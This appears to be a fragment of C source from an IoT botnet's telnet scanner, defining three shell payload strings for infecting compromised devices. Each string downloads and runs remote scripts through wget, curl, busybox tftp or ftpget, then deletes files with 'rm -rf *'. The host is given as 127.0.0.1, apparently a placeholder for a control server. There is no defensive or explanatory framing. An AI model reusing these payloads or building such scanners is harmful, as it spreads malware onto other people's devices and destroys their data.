...
char *Busybox_Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://127.0.0.1/bins.sh; curl -O http://127.0.0.1/bins.sh; /bin/busybox wget http://127.0.0./bin.sh; /bin/busybox tftp 127.0.0.1 -c get tftp1.sh; chmod 777 bins.sh; sh bins.sh; tftp 127.0.0.1 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp1.sh -g 127.0.0.1; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u anonymous -p anonymous -P 21 127.0.0.1 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp1.sh ftp1.sh; rm -rf *\r\n"; //Telnet Scanner Must implement Busybox.
char *Payload = "cd /tmp; rm -rf *; cd /tmp/; wget http://127.0.0.1/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://127.0.0.1/bins.sh; sh bins.sh; rm -rf bins.sh"; //Normal Payload Without busybox Implemented.
char *phonepayload = "cd /tmp; rm -rf *; cd /tmp/; wget http://127.0.0.1/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://127.0.0.1/bins.sh; sh bins.sh; rm -rf bins.sh\r\n";
